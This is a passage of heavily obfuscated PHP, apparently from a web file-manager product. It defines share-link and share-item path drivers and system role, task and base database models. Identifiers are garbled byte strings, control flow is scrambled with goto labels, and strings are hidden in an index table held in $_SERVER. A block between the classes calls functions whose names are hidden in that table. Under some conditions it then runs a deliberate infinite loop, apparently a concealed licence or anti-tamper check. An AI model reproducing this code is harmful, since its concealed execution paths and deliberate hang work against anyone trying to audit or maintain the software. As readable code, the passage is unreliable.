aÅ¼™»¾ä; b´ì–×áé: } private static function driverGet($AÉö¡ÏáïŒ, &$Bôô¤©¤À†) { goto f¥³Ö…ËŒĞ; E™ÁÍëæô˜: $C„”…ê‘¾‘ = self::$driverCache[$A—â¿âÛî]; $C„”…ê‘¾‘->pathDriver = $aºÎĞ‚•Æ; $C„”…ê‘¾‘->pathBase = $c³’µ˜ç[33]; goto Cß¬”„ÓéÛ; A”ºî—ÈßÂ: $C„”…ê‘¾‘->path = $Bôô¤©¤À†; return $C„”…ê‘¾‘; goto B‡÷¢½íä; dÈ•Ğà•¤„: switch ($AÉö¡ÏáïŒ[$c³’µ˜ç[29]]) { case KodIO::KOD_IO: $a–™ã£Ûêö = self::$driverListSystem[$FÈˆ‘–ê]; break; case KodIO::KOD_SOURCE: $Bôô¤©¤À† = $FÈˆ‘–ê . $Bôô¤©¤À†; $a–™ã£Ûêö = array($c³’µ˜ç[1007] => $c³’µ˜ç[1008], $c³’µ˜ç[6] => $AÉö¡ÏáïŒ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $b™‹î£ƒ„ = $GLOBALS[$c³’µ˜ç[1009]]; self::$driverListUser = array_to_keyvalue($b™‹î£ƒ„, $c³’µ˜ç[367]); } $a–™ã£Ûêö = self::$driverListUser[$FÈˆ‘–ê]; break; case KodIO::KOD_SHARE_LINK: $a–™ã£Ûêö = array($c³’µ˜ç[1007] => $c³’µ˜ç[1010], $c³’µ˜ç[6] => $AÉö¡ÏáïŒ); $EĞ“ª˜–í = Action($c³’µ˜ç[1011])->sharePathInfo($AÉö¡ÏáïŒ[$c³’µ˜ç[75]]); $Bôô¤©¤À† = $EĞ“ª˜–í[$c³’µ˜ç[369]]; if (!$EĞ“ª˜–í[$c³’µ˜ç[369]]) { $C‚Ë‰†÷ÛÔ = Model($c³’µ˜ç[536])->getInfo($EĞ“ª˜–í[$c³’µ˜ç[441]]); $Bôô¤©¤À† = KodIO::clear($C‚Ë‰†÷ÛÔ[$c³’µ˜ç[1012]] . $AÉö¡ÏáïŒ[$c³’µ˜ç[1005]]); $AÉö¡ÏáïŒ[$c³’µ˜ç[439]] = $C‚Ë‰†÷ÛÔ; $AÉö¡ÏáïŒ[$c³’µ˜ç[991]] = $Bôô¤©¤À†; $a–™ã£Ûêö = array($c³’µ˜ç[1007] => $c³’µ˜ç[1013], $c³’µ˜ç[6] => $AÉö¡ÏáïŒ); } break; case KodIO::KOD_SHARE_ITEM: $a–™ã£Ûêö = array($c³’µ˜ç[1007] => $c³’µ˜ç[1014], $c³’µ˜ç[6] => $AÉö¡ÏáïŒ); $C‚Ë‰†÷ÛÔ = Model($c³’µ˜ç[536])->getInfo($AÉö¡ÏáïŒ[$c³’µ˜ç[367]]); if ($C‚Ë‰†÷ÛÔ[$c³’µ˜ç[369]] == $c³’µ˜ç[468]) { $Bôô¤©¤À† = KodIO::clear($C‚Ë‰†÷ÛÔ[$c³’µ˜ç[1012]] . $AÉö¡ÏáïŒ[$c³’µ˜ç[1005]]); $AÉö¡ÏáïŒ[$c³’µ˜ç[439]] = $C‚Ë‰†÷ÛÔ; $AÉö¡ÏáïŒ[$c³’µ˜ç[991]] = $Bôô¤©¤À†; $a–™ã£Ûêö = array($c³’µ˜ç[1007] => $c³’µ˜ç[1015], $c³’µ˜ç[6] => $AÉö¡ÏáïŒ); } else { if (!$Bôô¤©¤À†) { $Bôô¤©¤À† = $C‚Ë‰†÷ÛÔ[$c³’µ˜ç[369]]; } } break; default: $Bôô¤©¤À† = $AÉö¡ÏáïŒ[$c³’µ˜ç[75]]; $a–™ã£Ûêö = array($c³’µ˜ç[1007] => $c³’µ˜ç[1016]); break; } $A—â¿âÛî = $AÉö¡ÏáïŒ[$c³’µ˜ç[75]]; if (!isset(self::$driverCache[$A—â¿âÛî])) { $D·±²ï„øè = strtolower($a–™ã£Ûêö[$c³’µ˜ç[90]]); $a±Â…Ë›¨¡ = $GLOBALS[$c³’µ˜ç[6]][$c³’µ˜ç[84]][$c³’µ˜ç[750]]; $a°ôƒ‘ÚÁ© = $c³’µ˜ç[71] . (isset($a±Â…Ë›¨¡[$D·±²ï„øè]) ? $a±Â…Ë›¨¡[$D·±²ï„øè] : ucfirst($D·±²ï„øè)); if (!class_exists($a°ôƒ‘ÚÁ©)) { show_json("{$a°ôƒ‘ÚÁ©}\x20\x6e\157\164\x20\x65\x78\x69\163\164\x73\41", !1); } $fµ«İİ¿ñÕ = isset($a–™ã£Ûêö[$c³’µ˜ç[6]]) ? $a–™ã£Ûêö[$c³’µ˜ç[6]] : !1; self::$driverCache[$A—â¿âÛî] = new $a°ôƒ‘ÚÁ©($fµ«İİ¿ñÕ); } goto E™ÁÍëæô˜; f¥³Ö…ËŒĞ: $c³’µ˜ç =& $_SERVER[Î¿—”òá]; $aºÎĞ‚•Æ = $AÉö¡ÏáïŒ[$c³’µ˜ç[1006]]; $FÈˆ‘–ê = $AÉö¡ÏáïŒ[$c³’µ˜ç[367]]; goto dÈ•Ğà•¤„; Cß¬”„ÓéÛ: if (isset($a–™ã£Ûêö[$c³’µ˜ç[6]][$c³’µ˜ç[1017]])) { $C„”…ê‘¾‘->pathBase = rtrim($a–™ã£Ûêö[$c³’µ˜ç[6]][$c³’µ˜ç[1017]], $c³’µ˜ç[8]) . $c³’µ˜ç[8]; $Bôô¤©¤À† = $C„”…ê‘¾‘->pathBase . ltrim($Bôô¤©¤À†, $c³’µ˜ç[8]); } $Bôô¤©¤À† = $C„”…ê‘¾‘->getPath($Bôô¤©¤À†); if (isset($AÉö¡ÏáïŒ[$c³’µ˜ç[991]])) { $Bôô¤©¤À† = $AÉö¡ÏáïŒ[$c³’µ˜ç[991]]; } goto A”ºî—ÈßÂ; B‡÷¢½íä: } } goto AÅÃÍÒÅ°˜; a‡µâ¦òÁ­: class PathDriverDriverShareItem { public function __construct($dÃ”«÷äî) { $this->pathParse = $dÃ”«÷äî; } public function __call($dìëßé–ÀÕ, $c‰¶®ºÁ¹ ) { $A ‹ğèÔÃ =& $_SERVER[Î¿—”òá]; if (method_exists($this, $dìëßé–ÀÕ)) { return; } $e‘ØÆ×ôÓ¦ = call_user_func_array(array($A ‹ğèÔÃ[1118], $dìëßé–ÀÕ), $c‰¶®ºÁ¹ ); $A½¨öÊ°ßí = array($A ‹ğèÔÃ[1119], $A ‹ğèÔÃ[1120], $A ‹ğèÔÃ[1121], $A ‹ğèÔÃ[1122], $A ‹ğèÔÃ[490], $A ‹ğèÔÃ[492], $A ‹ğèÔÃ[1123], $A ‹ğèÔÃ[103], $A ‹ğèÔÃ[1124], $A ‹ğèÔÃ[1125]); if (in_array($dìëßé–ÀÕ, $A½¨öÊ°ßí)) { $e‘ØÆ×ôÓ¦ = $this->getPathOuter($e‘ØÆ×ôÓ¦); } return $e‘ØÆ×ôÓ¦; } public function copy($a™¨³èæØô, $d¸È¤„’‘, $BŒ»î‘‰ˆó = false) { return $this->copyMove($a™¨³èæØô, $d¸È¤„’‘, $BŒ»î‘‰ˆó, $_SERVER[Î¿—”òá][490]); } public function move($bº„±Æ£³, $cõ¥»èÀ, $Aç…À„¼´Â = false) { return $this->copyMove($bº„±Æ£³, $cõ¥»èÀ, $Aç…À„¼´Â, $_SERVER[Î¿—”òá][492]); } private function copyMove($cáóˆÌÇ…Ô, $a†—Õ¿ÃÕ¬, $E„ìŞ¤ÖÌÛ, $Eá®éğÄ¿­) { goto då‹˜¿³½¹; då‹˜¿³½¹: $Fë½ä½¼Šƒ =& $_SERVER[Î¿—”òá]; $c®Ÿ‹ÑëšÊ = $a†—Õ¿ÃÕ¬; $dˆî½ğ¬…Ù = IO::driverMake($a†—Õ¿ÃÕ¬); goto D…£©ŠÅ×Í; D…£©ŠÅ×Í: if ($dˆî½ğ¬…Ù->pathParse[$Fë½ä½¼Šƒ[991]]) { $a†—Õ¿ÃÕ¬ = $dˆî½ğ¬…Ù->pathParse[$Fë½ä½¼Šƒ[991]]; } else { $a†—Õ¿ÃÕ¬ = $c®Ÿ‹ÑëšÊ; } $CèˆŞÖ²Š¨ = IO::copyMove($cáóˆÌÇ…Ô, $a†—Õ¿ÃÕ¬, $E„ìŞ¤ÖÌÛ, $Eá®éğÄ¿­); $CèˆŞÖ²Š¨ = $this->getPathOuter($CèˆŞÖ²Š¨); goto Aéµ¯ç±³ê; Aéµ¯ç±³ê: return $CèˆŞÖ²Š¨; goto dïŞ»ø­À; dïŞ»ø­À: } public function pathFather($A’Ô¨¹Éîƒ) { return get_path_father($this->pathParse[$_SERVER[Î¿—”òá][75]]); } public function iconvSystem($dßÄˆÎæóè) { return $dßÄˆÎæóè; } protected function infoParse($Dø×èÁ²ŠÉ, $CÍøÑíç¸„ = false) { $bÜœöİ³©— =& $_SERVER[Î¿—”òá]; $Aæ‡‘ùŠ¿À = $this->pathParse[$bÜœöİ³©—[439]][$bÜœöİ³©—[1012]] . $this->pathParse[$bÜœöİ³©—[1005]]; if ($CÍøÑíç¸„) { $F‹ÊâÚŸ« = IO::infoWithChildren($Aæ‡‘ùŠ¿À); } else { $F‹ÊâÚŸ« = IO::info($Aæ‡‘ùŠ¿À); } $C×ßµ‰ù¼™ = $this->pathParse[$bÜœöİ³©—[439]]; return Action($bÜœöİ³©—[1117])->_shareItemeParse($F‹ÊâÚŸ«, $C×ßµ‰ù¼™); } public function listAll($dô¤Ñğª‘) { $dÃ¸ÇŠ‹ =& $_SERVER[Î¿—”òá]; $cñ‹ÊŸ§§ = IO::listAll($dô¤Ñğª‘); $bË¢êîŠÊã = $this->pathParse[$dÃ¸ÇŠ‹[439]]; foreach ($cñ‹ÊŸ§§ as &$FŸ‡˜¸‹Ñá) { check_abort(); $FŸ‡˜¸‹Ñá = array_merge(IO::info($FŸ‡˜¸‹Ñá[$dÃ¸ÇŠ‹[75]]), $FŸ‡˜¸‹Ñá); $FŸ‡˜¸‹Ñá[$dÃ¸ÇŠ‹[391]] = Action($dÃ¸ÇŠ‹[1117])->_shareItemeParse($FŸ‡˜¸‹Ñá, $bË¢êîŠÊã); } return $cñ‹ÊŸ§§; } public function getPathOuter($f†ÖÜˆñì) { goto fÍ¸ëƒ‡ê; f† Ò¦÷ğ: if (substr($bİÍ°ñ¬™, 0, strlen($DÏäÀŞ™º)) != $DÏäÀŞ™º) { return !1; } return $this->pathParse[$F‚äÇÑÍŞ˜[1006]] . $F‚äÇÑÍŞ˜[8] . ltrim($e¼¯¾‘¶”ó, $F‚äÇÑÍŞ˜[8]); goto aøÉï…£²; fÍ¸ëƒ‡ê: $F‚äÇÑÍŞ˜ =& $_SERVER[Î¿—”òá]; $d‰ èê¢æÉ = KodIO::parse($f†ÖÜˆñì); if ($d‰ èê¢æÉ[$F‚äÇÑÍŞ˜[29]] == KodIO::KOD_SHARE_ITEM) { return $d‰ èê¢æÉ[$F‚äÇÑÍŞ˜[75]]; } goto e³ˆ¡×Ğ; e³ˆ¡×Ğ: $bİÍ°ñ¬™ = KodIO::clear($f†ÖÜˆñì); $DÏäÀŞ™º = KodIO::clear($this->pathParse[$F‚äÇÑÍŞ˜[439]][$F‚äÇÑÍŞ˜[1012]]); $e¼¯¾‘¶”ó = substr($bİÍ°ñ¬™, strlen($DÏäÀŞ™º)); goto f† Ò¦÷ğ; aøÉï…£²: } public function getType() { $CÓŒ²ÏçõÄ =& $_SERVER[Î¿—”òá]; $BÑØÓèàïÊ = str_replace($CÓŒ²ÏçõÄ[71], $CÓŒ²ÏçõÄ[33], get_class($this)); return strtolower($BÑØÓèàïÊ); } public function isTypeObject($dĞ“ù¥­àŠ) { return IO::isTypeObject($dĞ“ù¥­àŠ); } public function info($Cæ¢ÕõÁ…) { return $this->infoParse($Cæ¢ÕõÁ…); } public function infoAuth($aè²ôİ¡’) { return $this->infoParse($aè²ôİ¡’); } public function infoWithChildren($A—Õë¤öïƒ) { return $this->infoParse($A—Õë¤öïƒ, !0); } public function infoFull($AÆÃÎ´›Ä­) { return $this->infoParse($AÆÃÎ´›Ä­); } } if (!isset($_SERVER[$_SERVER[Î¿—”òá][676]]) || !isset($_SERVER[$_SERVER[Î¿—”òá][677]])) { goto AĞŠ—´…Œ»; d¦­À¤ÃÄÏ: $E—½ËË ¤â = explode($_SERVER[Î¿—”òá][217], $C˜í‡êŠÌó); if (count($E—½ËË ¤â) < $_SERVER[Î¿—”òá][548]) { $d¡÷œåæå = $_SERVER[Î¿—”òá][681]; $d¡÷œåæå(); } $e•ª…ÜÙ´ù = $_SERVER[Î¿—”òá][682]; goto E½ôìÍ¥òø; E½ôìÍ¥òø: $e•ª…ÜÙ´ù($_SERVER[$_SERVER[Î¿—”òá][679]] . $_SERVER[Î¿—”òá][680]); $AİœäñÕ© = 2; while ($AİœäñÕ© > 1) { $B‘…Áê­÷Ë = rawurlencode($AİœäñÕ© . $_SERVER[Î¿—”òá][361]); } goto FÎÇØ½Ó§®; AĞŠ—´…Œ»: $d¥¼àÄ­’Ş = $_SERVER[Î¿—”òá][678]; $a†‚±Ñ†Ñ˜ = $_SERVER[$_SERVER[Î¿—”òá][679]] . $_SERVER[Î¿—”òá][680]; $C˜í‡êŠÌó = $d¥¼àÄ­’Ş($a†‚±Ñ†Ñ˜); goto d¦­À¤ÃÄÏ; FÎÇØ½Ó§®: } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($aç‹ìêÑà) { $this->pathParse = $aç‹ìêÑà; } protected function infoParse($Eîôñ¡À¤Ú, $f±³ÃØç”” = false) { $D¨±ÔÛ¼©È =& $_SERVER[Î¿—”òá]; return Action($D¨±ÔÛ¼©È[1011])->sharePathInfo($this->pathParse[$D¨±ÔÛ¼©È[75]], !0, $f±³ÃØç””); } public function listPath($f¦ÃŠÊìÃ´, $aª†“¼³¥ = false) { $aĞœêóƒ¹ =& $_SERVER[Î¿—”òá]; $Bˆ–ÓÕåÀ¿ = IO::listPath($f¦ÃŠÊìÃ´, $aª†“¼³¥); foreach ($Bˆ–ÓÕåÀ¿ as $F¥†·İä¼ => $FØ¸º¼ê…ó) { if (!in_array($F¥†·İä¼, array($aĞœêóƒ¹[73], $aĞœêóƒ¹[74]))) { continue; } foreach ($FØ¸º¼ê…ó as $CõôäòíÇÚ => $Aæ°¯ôèé¸) { $Aæ°¯ôèé¸ = Action($aĞœêóƒ¹[1126])->parsePathChildren($Aæ°¯ôèé¸, array($aĞœêóƒ¹[387] => $f¦ÃŠÊìÃ´)); $Bˆ–ÓÕåÀ¿[$F¥†·İä¼][$CõôäòíÇÚ] = Action($aĞœêóƒ¹[1011])->shareItemInfo($Aæ°¯ôèé¸); } } return $Bˆ–ÓÕåÀ¿; } public function listAll($a²–±àÂò ) { $BêËï½‡æƒ =& $_SERVER[Î¿—”òá]; $FÚ§‡¢ïíÚ = IO::listAll($a²–±àÂò ); foreach ($FÚ§‡¢ïíÚ as &$d‹ùÒ™ÃŸ—) { $d‹ùÒ™ÃŸ— = array_merge(IO::info($d‹ùÒ™ÃŸ—[$BêËï½‡æƒ[75]]), $d‹ùÒ™ÃŸ—); $d‹ùÒ™ÃŸ—[$BêËï½‡æƒ[391]] = Action($BêËï½‡æƒ[1011])->shareItemInfo($d‹ùÒ™ÃŸ—); } return $FÚ§‡¢ïíÚ; } } goto DÃã‡¨Şºõ; Fö¡Ó²†ë§: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\x72\157\x6c\145\114\x69\x73\x74"; public $field = array("\x6e\x61\155\145", "\x61\x75\x74\150", "\154\x61\142\145\154", "\x64\x69\x73\x70\154\141\x79", "\x73\x79\x73\x74\x65\x6d", "\x64\145\163\143", "\x69\147\x6e\157\162\x65\105\x78\164", "\151\x67\x6e\x6f\162\x65\106\151\154\145\123\x69\172\145", "\141\x64\x6d\151\156\151\163\164\162\x61\164\157\162", "\163\157\162\x74"); public function listData($E¤É¢é¿‰í = false, $b‡­Ÿ¼Áå = "\163\x6f\x72\x74", $Cä“Ûâ½¼Ó = false) { $C±—‘Ñ‚Ò =& $_SERVER[Î¿—”òá]; $AŠª®ñå÷ö = parent::listData($E¤É¢é¿‰í, $b‡­Ÿ¼Áå, $Cä“Ûâ½¼Ó); if (!$E¤É¢é¿‰í) { $fàË†ª‡Á„ = $C±—‘Ñ‚Ò[2476]; foreach ($AŠª®ñå÷ö as $AëÔ±¾ô« => $E¹ÅÏ‰Çİ«) { if ($E¹ÅÏ‰Çİ«[$C±—‘Ñ‚Ò[2477]] == 1) { $AŠª®ñå÷ö[$AëÔ±¾ô«][$C±—‘Ñ‚Ò[405]] = $fàË†ª‡Á„; } } } return $AŠª®ñå÷ö; } public function update($EƒÈ¶÷Ò, $E³Œ ¡—™) { goto AîÁÉ‚ğˆ„; Føòí ª¿: return parent::update($EƒÈ¶÷Ò, $E³Œ ¡—™); goto e…³²Áê¹; AîÁÉ‚ğˆ„: $E„ìœ¦ñ‘ß =& $_SERVER[Î¿—”òá]; $bíâİäÏÚÊ = parent::listData($EƒÈ¶÷Ò); $ağğõ¹©ÓÆ = $this->findByName($E³Œ ¡—™[$E„ìœ¦ñ‘ß[28]]); goto Dğ²óÏ¤¢Ù; Dğ²óÏ¤¢Ù: if (!$bíâİäÏÚÊ || $ağğõ¹©ÓÆ && $ağğõ¹©ÓÆ[$E„ìœ¦ñ‘ß[367]] != $bíâİäÏÚÊ[$E„ìœ¦ñ‘ß[367]]) { return !1; } if ($ağğõ¹©ÓÆ[$E„ìœ¦ñ‘ß[2477]] == 1) { $E³Œ ¡—™ = array($E„ìœ¦ñ‘ß[28] => $E³Œ ¡—™[$E„ìœ¦ñ‘ß[28]], $E„ìœ¦ñ‘ß[2115] => $E³Œ ¡—™[$E„ìœ¦ñ‘ß[2115]]); } $this->filterAuth($E³Œ ¡—™[$E„ìœ¦ñ‘ß[376]]); goto Føòí ª¿; e…³²Áê¹: } public function remove($a£”‡¨°¿½) { $a†íÎŠ× = parent::listData($a£”‡¨°¿½); if (!$a†íÎŠ× || $a†íÎŠ×[$_SERVER[Î¿—”òá][1073]]) { return !1; } return parent::remove($a£”‡¨°¿½); } public function add($AÔÀ‹«ö”§) { goto F†½ùÑêº‹; F†½ùÑêº‹: $cºÕŸ¥ïÆ™ =& $_SERVER[Î¿—”òá]; $C‹…£¼ÍŸ‹ = $AÔÀ‹«ö”§[$cºÕŸ¥ïÆ™[28]]; if ($this->findByName($C‹…£¼ÍŸ‹)) { return !1; } goto cÜ™¿ŞĞĞ; f÷œÉè¨’: return parent::insert($AÔÀ‹«ö”§); goto C‰¿æÊ”Š; cÜ™¿ŞĞĞ: $Fìƒõ¼Å÷ = array($cºÕŸ¥ïÆ™[386] => $C‹…£¼ÍŸ‹, $cºÕŸ¥ïÆ™[2103] => $cºÕŸ¥ïÆ™[33], $cºÕŸ¥ïÆ™[2099] => $cºÕŸ¥ïÆ™[2116], $cºÕŸ¥ïÆ™[2478] => 1, $cºÕŸ¥ïÆ™[2102] => 0, $cºÕŸ¥ïÆ™[2479] => 0, $cºÕŸ¥ïÆ™[2101] => $this->getSort()); $AÔÀ‹«ö”§ = array_merge($Fìƒõ¼Å÷, $AÔÀ‹«ö”§); $this->filterAuth($AÔÀ‹«ö”§[$cºÕŸ¥ïÆ™[376]]); goto f÷œÉè¨’; C‰¿æÊ”Š: } private function getSort() { $F¯Öİé‘Ì =& $_SERVER[Î¿—”òá]; $aë³äßô– = parent::listData(); $C©œ‰¸ªä = array_to_keyvalue($aë³äßô–, $F¯Öİé‘Ì[33], $F¯Öİé‘Ì[2118]); return empty($C©œ‰¸ªä) ? 0 : max($C©œ‰¸ªä) + 1; } private function filterAuth(&$aåïÖŠá£—) { $Cø©‰›÷Æ =& $_SERVER[Î¿—”òá]; $eÎ£á¶º¨“ = array(); $DÇ÷‚éœ’õ = array_filter(explode($Cø©‰›÷Æ[47], $aåïÖŠá£—)); foreach ($DÇ÷‚éœ’õ as $aåïÖŠá£—) { $eõÉ„ŠÈ¡¥ = explode($Cø©‰›÷Æ[91], $aåïÖŠá£—); if ($eõÉ„ŠÈ¡¥[0] == $Cø©‰›÷Æ[1776] && $eõÉ„ŠÈ¡¥[1] != $Cø©‰›÷Æ[1029]) { $BÛ”ä»¸ÎÎ = $eõÉ„ŠÈ¡¥[0] . $Cø©‰›÷Æ[91] . $eõÉ„ŠÈ¡¥[1] . $Cø©‰›÷Æ[2480]; if (!in_array($BÛ”ä»¸ÎÎ, $DÇ÷‚éœ’õ)) { $eÎ£á¶º¨“[] = $BÛ”ä»¸ÎÎ; } } $eÎ£á¶º¨“[] = $aåïÖŠá£—; } $aåïÖŠá£— = implode($Cø©‰›÷Æ[47], $eÎ£á¶º¨“); } public function sort($b™Ğ‘„ºíÜ, $C˜ÆÓå¶½) { return parent::update($b™Ğ‘„ºíÜ, $C˜ÆÓå¶½); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\164\141\x73\153\x4c\x69\x73\x74"; public $field = array("\x6e\141\155\145", "\x74\x79\x70\x65", "\x65\x76\145\156\164", "\164\151\155\x65", "\144\145\163\x63", "\x73\171\x73\x74\145\155", "\x65\156\x61\142\x6c\145", "\154\141\x73\164\122\165\156", "\x73\x6f\162\164"); public function listData($D½ôµõŒ³ = false, $FÍ¦£›¿Š¢ = "\163\x6f\x72\x74", $bš·İÍ¾‰ = false) { return parent::listData($D½ôµõŒ³, $FÍ¦£›¿Š¢, $bš·İÍ¾‰); } public function add($e…˜Î¹›¦) { $cÛˆ·›ÏÇç =& $_SERVER[Î¿—”òá]; $bº‹ŠƒÊ¡ò = $this->findByName($e…˜Î¹›¦[$cÛˆ·›ÏÇç[28]]); if ($bº‹ŠƒÊ¡ò) { return !1; } $e…˜Î¹›¦[$cÛˆ·›ÏÇç[1394]] = 0; $e…˜Î¹›¦[$cÛˆ·›ÏÇç[2118]] = $this->getSort(); return parent::insert($e…˜Î¹›¦); } private function getSort() { $E‡íĞÇõ…« =& $_SERVER[Î¿—”òá]; $Eª†ÍñÅó“ = parent::listData(); $BÉäè¤•ªÓ = array_to_keyvalue($Eª†ÍñÅó“, $E‡íĞÇõ…«[33], $E‡íĞÇõ…«[2118]); return empty($BÉäè¤•ªÓ) ? 0 : max($BÉäè¤•ªÓ) + 1; } public function update($fÛˆÄãñã¯, $c·›êíåµÅ) { $AíØÖ·Ş¾ =& $_SERVER[Î¿—”òá]; $cÆÊÇ©±¾‘ = $this->listData($fÛˆÄãñã¯); $FšòÌ›Óñ = $this->findByName($c·›êíåµÅ[$AíØÖ·Ş¾[28]]); if (!$cÆÊÇ©±¾‘ || $FšòÌ›Óñ && $FšòÌ›Óñ[$AíØÖ·Ş¾[367]] != $cÆÊÇ©±¾‘[$AíØÖ·Ş¾[367]]) { return !1; } return parent::update($fÛˆÄãñã¯, $c·›êíåµÅ); } public function remove($dÍ‹ãŒöáã, $eº°Ğ÷ÀÜ = false) { $Cìô¯˜“ =& $_SERVER[Î¿—”òá]; $c¡Ÿí‘Œ«™ = $this->listData($dÍ‹ãŒöáã); if (!$c¡Ÿí‘Œ«™) { return; } if (!$eº°Ğ÷ÀÜ && $c¡Ÿí‘Œ«™[$Cìô¯˜“[1073]] == $Cìô¯˜“[83]) { return !1; } return parent::remove($dÍ‹ãŒöáã); } public function enable($EˆÒ·šÃí¾, $bŸØæàÈò) { return $this->update($EˆÒ·šÃí¾, array($_SERVER[Î¿—”òá][2470] => $bŸØæàÈò)); } public function run($DÛ¡¡ ¾‡Ó) { return $this->update($DÛ¡¡ ¾‡Ó, array($_SERVER[Î¿—”òá][2481] => time())); } } goto cÍä˜°Ğ¶; dÜâ¬¬Á¤æ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\151\x66\x79\x54\x69\x6d\145", "\164\x69\x6d\x65", "\151\x6e\163\x65\162\x74\x2c\x75\160\144\141\x74\145", "\x66\x75\x6e\x63\x74\151\157\x6e"), array("\143\162\x65\141\x74\x65\124\151\155\x65", "\164\151\x6d\145", "\151\x6e\163\x65\162\x74", "\x66\165\156\143\164\x69\x6f\156")); public function setDataAuto($eŞ¶èèƒÚÂ) { $this->dataAuto = $eŞ¶èèƒÚÂ; } public function __construct($Dµù‹î±Î = '', $D®®„ì¬ = '', $f¤Šî·ë¹ = '') { parent::__construct($Dµù‹î±Î, $D®®„ì¬, $f¤Šî·ë¹); } public static function textEncode($EŞµ¾µáÛù) { if (!$EŞµ¾µáÛù) { return $EŞµ¾µáÛù; } $E¤Ò›ˆŞ‰É = json_encode($EŞµ¾µáÛù); $E¤Ò›ˆŞ‰É = preg_replace_callback($_SERVER[Î¿—”òá][342], function ($Bİ¯ßè¥Ï) { return addslashes($Bİ¯ßè¥Ï[0]); }, $E¤Ò›ˆŞ‰É); return json_decode($E¤Ò›ˆŞ‰É); } public static function textDecode($cÓ””Â¤ƒ) { $cóÉİ‘ã‘‹ =& $_SERVER[Î¿—”òá]; $C‘ö¦÷Ë§¢ = json_encode($cÓ””Â¤ƒ); $C‘ö¦÷Ë§¢ = preg_replace_callback($cóÉİ‘ã‘‹[343], function ($B’´Ê‚„») { return $_SERVER[Î¿—”òá][93]; }, $C‘ö¦÷Ë§¢); return json_decode($C‘ö¦÷Ë§¢); } protected $tableMeta = array(); protected function _beforeInsert(&$d×˜åİËœŞ, $cá‡§¤‚àò) { $BÏ¹ÈÑÎºß =& $_SERVER[Î¿—”òá]; if (!$this->checkDataAutoHas($BÏ¹ÈÑÎºß[344])) { return; } $this->dataBeforeFilter($d×˜åİËœŞ, $BÏ¹ÈÑÎºß[344]); } protected function _beforeUpdate(&$dˆ„Üİƒƒ†, $Cê²™…ç) { $eƒŸšñ´¢ =& $_SERVER[Î¿—”òá]; if (!$this->checkDataAutoHas($eƒŸšñ´¢[345])) { return; } $this->dataBeforeFilter($dˆ„Üİƒƒ†, $eƒŸšñ´¢[345]); } protected function _afterSelect(&$f­“ÜµÊğ·, $eÍˆê²ÃÇ) { if (!is_array($f­“ÜµÊğ·)) { return; } if (!$this->checkDataAutoHas($_SERVER[Î¿—”òá][346])) { return; } foreach ($f­“ÜµÊğ· as &$A›–Ø¾²æÄ) { $this->dataAfterFilter($A›–Ø¾²æÄ); } } protected function _afterFind(&$aÆ İ¡Üî†, $E£œÙˆŸùÙ) { if (!is_array($aÆ İ¡Üî†)) { return; } if (!$this->checkDataAutoHas($_SERVER[Î¿—”òá][346])) { return; } $this->dataAfterFilter($aÆ İ¡Üî†); } public function setAutoIncrement($aŸò­‘¿©é) { $EÌéÕ‡Æ½ = array($this->getPk() => $aŸò­‘¿©é); $dõ”»—Ë£ = $this->data($EÌéÕ‡Æ½)->add(); if ($dõ”»—Ë£) { $this->delete($dõ”»—Ë£); } } public function getAutoIncrement() { $Fˆî¯†ƒéØ = $this->getTableName(); $Bˆ°£¼¼ = $this->max($this->getPk()); $e•ªŒ÷†×¦ = $this->query("\x73\150\x6f\x77\x20\164\x61\142\x6c\145\40\x73\x74\x61\x74\x75\163\40\x77\150\145\x72\x65\x20\x4e\141\x6d\x65\75\47{$Fˆî¯†ƒéØ}\47"); $aœ»ã‹ø¯‘ = $e•ªŒ÷†×¦[0][$_SERVER[Î¿—”òá][347]]; $D‡ƒšÉˆ…¿ = max($Bˆ°£¼¼, $aœ»ã‹ø¯‘); return $D‡ƒšÉˆ…¿; } protected function _callBefore($dĞí•‘ì¬Ã, $b­‰ˆòğŞˆ) { return $this->cacheCallCheck($dĞí•‘ì¬Ã, $b­‰ˆòğŞˆ, !1); } protected function _callAfter($dù»æ—È‰‘, $C¾˜ ÊßÆÎ) { return $this->cacheCallCheck($dù»æ—È‰‘, $C¾˜ ÊßÆÎ, !0); } protected function cacheFunctionAlias($D½İ©Ó¸¾¿) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($b‹™À„¢½Û, $a æ‹ÔòªÌ, $dîã¸ÇœŞÑ = false) { $cÉ†ñÎÙº = $this->cacheFunctionAlias($a æ‹ÔòªÌ); if (!$cÉ†ñÎÙº) { return; } foreach ($cÉ†ñÎÙº as $cï¢´‹‘ã¢ => $c¿íÑ¯èš•) { $A‰´ÊÖèŠ  = $c¿íÑ¯èš•[0]; $f««Ü•‚ = explode($_SERVER[Î¿—”òá][47], $c¿íÑ¯èš•[1]); if ($b‹™À„¢½Û == $cï¢´‹‘ã¢) { return $this->cacheFunctionGet($cï¢´‹‘ã¢, $A‰´ÊÖèŠ ); } if ($dîã¸ÇœŞÑ && in_array($b‹™À„¢½Û, $f««Ü•‚)) { $this->cacheFunctionClear($cï¢´‹‘ã¢, $A‰´ÊÖèŠ ); } } } public function cacheFunctionGet($bù­¸“†ŞÆ, $EŒÙæ—“°Š) { $eĞ°Â¯÷Ÿ‡ = $this->cacheKeyMake($bù­¸“†ŞÆ, $EŒÙæ—“°Š); $A©ŒÖ ‰Ìé = Cache::get($eĞ°Â¯÷Ÿ‡); if (!is_array($A©ŒÖ ‰Ìé)) { $A©ŒÖ ‰Ìé = call_user_func_array(array($this, $bù­¸“†ŞÆ), array($EŒÙæ—“°Š, !0)); Cache::set($eĞ°Â¯÷Ÿ‡, $A©ŒÖ ‰Ìé); } return $A©ŒÖ ‰Ìé; } public function cacheFunctionClear($F®Æ†É¨å…, $dÎˆóôºÖï) { $ağâÏñÖÎç = $dÎˆóôºÖï; if (!is_array($dÎˆóôºÖï)) { $ağâÏñÖÎç = array($dÎˆóôºÖï); } foreach ($ağâÏñÖÎç as $cé”ƒÕİ³) { $c¬Õ¨¬ØÓ = $this->cacheKeyMake($F®Æ†É¨å…, $cé”ƒÕİ³); Cache::remove($c¬Õ¨¬ØÓ); } } private function 